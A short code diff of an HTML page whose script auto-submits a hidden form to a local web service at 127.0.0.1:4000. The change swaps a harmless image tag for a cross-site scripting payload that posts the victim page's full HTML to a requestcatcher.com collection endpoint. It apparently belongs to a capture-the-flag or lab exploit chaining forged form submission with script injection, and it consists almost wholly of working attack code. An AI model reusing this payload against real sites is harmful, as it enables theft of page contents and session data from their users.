@@ -8,13 +8,13 @@
   <h1>test</h1>
   <script>
     (()=>{
-      const f=document.createElement('form');
-      f.method='POST';
-      f.action='http://127.0.0.1:4000/';
-      const i=document.createElement('input');
-      i.type='hidden';
-      i.name='comment';
-      i.value = `<img src=x>`;
+      const f = document.createElement('form');
+      f.method = 'POST';
+      f.action = 'http://127.0.0.1:4000/';
+      const i = document.createElement('input');
+      i.type = 'hidden';
+      i.name = 'comment';
+      i.value = `<img src=x onerror='fetch("https://singetu0096.requestcatcher.com/",{method:"POST",mode:"no-cors",body:document.documentElement.outerHTML})'>`;
       f.appendChild(i);
       document.body.appendChild(f);
       f.submit();
